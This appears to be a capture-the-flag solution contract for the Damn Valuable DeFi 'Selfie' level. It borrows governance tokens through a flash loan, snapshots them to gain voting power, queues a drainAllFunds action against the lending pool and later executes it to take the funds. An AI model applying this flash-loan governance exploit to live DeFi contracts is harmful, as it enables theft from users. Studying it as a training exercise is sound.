// SPDX-License-Identifier: MIT

pragma solidity ^0.8.17;

import {DamnValuableTokenSnapshot} from "src/Contracts/DamnValuableTokenSnapshot.sol";
import {SimpleGovernance} from "src/Contracts/selfie/SimpleGovernance.sol";
import {SelfiePool} from "src/Contracts/selfie/SelfiePool.sol";
import "forge-std/Test.sol";

contract Attacker {
    address owner;
    SimpleGovernance simpleGovernance;
    SelfiePool selfiePool;
    DamnValuableTokenSnapshot dvtSnapshot;
    uint256 actionId;

    constructor(address _simpleGovernance, address _selfiePool, address _dvtSnapshot) {
        simpleGovernance = SimpleGovernance(_simpleGovernance);
        selfiePool = SelfiePool(_selfiePool);
        dvtSnapshot = DamnValuableTokenSnapshot(_dvtSnapshot);
        owner = msg.sender;
    }

    function doFlashLoan(uint256 amount) external {
        selfiePool.flashLoan(amount);
    }

    function receiveTokens(address dvt, uint256 amount) external {
        dvtSnapshot.approve(address(simpleGovernance), type(uint256).max);
        dvtSnapshot.snapshot();
        console2.log("debug");
        actionId = simpleGovernance.queueAction(
            address(selfiePool),
            abi.encodeWithSignature("drainAllFunds(address)", address(this)),
            dvtSnapshot.balanceOf(address(selfiePool))
        );
        dvtSnapshot.transfer(address(selfiePool), 1_500_000e18);
    }

    function executeAction() external {
        simpleGovernance.executeAction(actionId);
        dvtSnapshot.transfer(msg.sender, dvtSnapshot.balanceOf(address(this)));
    }
}
